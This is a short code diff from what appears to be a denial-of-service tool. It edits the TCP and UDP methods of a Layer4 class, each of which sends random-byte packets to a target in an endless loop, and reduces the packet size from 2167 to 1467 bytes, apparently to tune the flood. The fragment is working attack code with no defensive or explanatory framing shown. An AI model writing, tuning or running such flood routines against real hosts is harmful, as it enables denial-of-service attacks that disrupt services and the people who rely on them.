@@ -500,7 +500,7 @@ class Layer4(Thread):
     def TCP(self) -> None:
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, randbytes(2167)):
+            while Tools.send(s, randbytes(1467)):
                 continue
         Tools.safe_close(s)
 
@@ -537,7 +537,7 @@ class Layer4(Thread):
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(2167), self._target):
+            while Tools.sendto(s, randbytes(1467), self._target):
                 continue
         Tools.safe_close(s)
 
